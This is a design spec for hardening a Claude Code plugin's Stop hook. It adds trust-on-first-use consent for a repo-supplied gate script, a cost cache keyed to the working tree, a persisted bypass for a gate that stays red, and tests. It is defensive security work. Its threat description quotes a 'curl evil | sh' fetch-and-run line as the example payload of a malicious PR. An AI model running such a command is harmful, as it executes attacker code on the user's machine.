# Spec: P11 — gate.sh hardening (trust, cost, escape valve)

**Slug:** `p11-gate-hardening` · **Created:** 2026-07-15 · **Backlog:** P11
**Status:** signed 2026-07-15 (owner) · shipped as v0.20.0 — metric PASS; review HOLD (2 false-skip Highs + env-override + test/wording) fixed in-release, re-verified
**Prime:** LEARNINGS.md (10 entries; "local verify green ≠ CI green" and the
fail-open-vs-fail-safe distinction are directly relevant — this release adds a
new trust boundary and must be tested on the real CI job, not just locally).
Source: flow-audit run #1's three gate.sh Highs/Mediums.

## R — Requirements

`scripts/gate.sh` (the Stop hook) has three defects; fix all three, add the
test coverage it never had.

1. **Trust (the headline).** The hook auto-executes `.claude/flywheel/gate.sh`
   — a repo file **any PR or clone can add or rewrite**, executable bit
   surviving checkout — with no consent. A malicious PR adding
   `.claude/flywheel/gate.sh` containing `curl evil | sh` runs on the victim's
   machine at the next turn end. Fix with **trust-on-first-use, fail-safe**: an
   untrusted gate is **not executed** (skip + a loud one-time note telling the
   user exactly how to trust it), not run-then-regret. Consent is a content
   hash stored **outside the repo tree** so a PR cannot self-authorize.
2. **Cost.** The full verification suite re-runs on every Stop — no-change Q&A
   turns, and immediately after `/flywheel:verify` ran the identical suite.
   Skip the run when the working tree is byte-for-byte the state that last
   passed (a tree signature cached on green).
3. **Escape valve.** After the MAX-consecutive-block bypass, the counter file
   is deleted, so a permanently-red gate re-traps every later turn (up to
   MAX blocks + forced continuations per turn, each a full suite run). Persist
   the bypass against the failing signature — cleared only by a green run — and
   honor `stop_hook_active` from the hook's stdin JSON as defense-in-depth.

## E — Entities

| Entity | Where | Notes |
| --- | --- | --- |
| Consent store | `${FLYWHEEL_STATE_DIR:-${XDG_STATE_HOME:-$HOME/.local/state}/flywheel}/trusted-gates` | one sha256 per line; **outside the repo** — a PR can't write it |
| Gate hash | sha256 of `.claude/flywheel/gate.sh` | `sha256sum`\|`shasum -a 256` |
| Pass signature | `git rev-parse HEAD` + sha of `git status --porcelain` + `git diff` | cached on green; cost cache key |
| Bypass marker | failing signature after MAX blocks | cleared on green; stops re-trapping |
| stdin JSON | `{ "stop_hook_active": bool, ... }` | parsed best-effort (python3), fail-open |

## A — Approach

Keep it a self-contained POSIX-ish bash hook (no new deps; python3 optional and
fail-open, as read-prime does). Trust is **fail-safe** (unknown gate → don't
run) while every *other* path stays **fail-open** (internal error → never block
the user) — the two are not in tension: refusing to run an unverified gate is
the safe default, and it never blocks the turn (exits 0 with guidance). Consent
lives outside the repo because anything inside can be added by the same PR that
adds the gate. Rejected: prompting interactively (a Stop hook is
non-interactive) and a settings.json-only command (loses the drop-in-file UX
the gate is valued for).

## S — Structure

- `scripts/gate.sh` — consent check → cost-cache short-circuit → run → block/
  bypass with persisted state + `stop_hook_active`.
- **New** `scripts/test-gate.sh` — the gate's first coverage.
- `.github/workflows/validate-plugins.yml` — run the new test.
- `README.md` + `skills/help/SKILL.md` — document the consent step.
- `.claude-plugin/plugin.json` → **0.20.0** · `upgrades/v0.20.0.md`
  (**`requires-action: true`** — existing gate users run the printed consent
  command once; needs a `## Strategy`).

## O — Operations

1. Compute the gate hash; if not in the consent store, print the trust
   instruction (with the literal command to run) to stderr and `exit 0` — do
   not execute. `FLYWHEEL_STATE_DIR` overrides the store location (for tests).
2. Parse stdin for `stop_hook_active` (python3, best-effort).
3. Cost cache: compute the tree signature; if it equals the last green
   signature, `exit 0` without running. (No git → always run.)
4. Run the trusted gate; on green, record the signature and clear
   counter/bypass; on red, the MAX-bounded block with a **persisted** bypass
   keyed to the failing signature + `stop_hook_active` short-circuit.
5. `scripts/test-gate.sh`: not-opted-in no-op; untrusted → skip + no exec (prove
   it never ran a sentinel); trusted+green → allow + signature cached; trusted+
   red → block (exit 2) then bypass after MAX; cost cache skips a re-run on an
   unchanged tree; bypass persists (no re-trap) until green. Wire into CI.
6. Docs; bump; `upgrades/v0.20.0.md` with the Strategy.

## N — Norms

Match the existing gate.sh voice and the read-prime fail-open idiom. No
non-portable constructs (the CI mawk/octal lesson applies to any regex; prefer
plain string ops). Every internal error path exits 0. `ok:`/`fail:` test idiom.

## S — Safeguards

- **Fail-safe on trust, fail-open on everything else**: an unverified gate is
  never executed; any *internal* failure (no sha tool, unreadable store,
  malformed stdin, no git) degrades to today's behavior and never blocks the
  turn.
- **Consent cannot be self-granted**: the store is outside the repo; a hash
  mismatch (gate edited) revokes trust automatically.
- **No secrets**: the hook never echoes gate contents beyond the existing
  tail-of-output on failure; the consent note prints only the hash + command.
- **The cost cache is a cache, not a gate**: it only ever *skips a re-run* of an
  already-green tree; it can never turn a red gate green (a changed tree always
  re-runs).

## Success metric

One command, exit 0 = PASS:

```bash
grep -q 'trusted-gates' scripts/gate.sh \
  && grep -q 'stop_hook_active' scripts/gate.sh \
  && grep -Eq 'rev-parse|porcelain' scripts/gate.sh \
  && test -f scripts/test-gate.sh \
  && bash scripts/test-gate.sh \
  && bash scripts/test-session-start.sh \
  && bash scripts/test-read-prime.sh \
  && bash scripts/test-docs-consistency.sh \
  && bash scripts/test-install-vendored.sh \
  && grep -q '"version": "0.20.0"' .claude-plugin/plugin.json \
  && test -f upgrades/v0.20.0.md \
  && grep -q 'requires-action: true' upgrades/v0.20.0.md
```
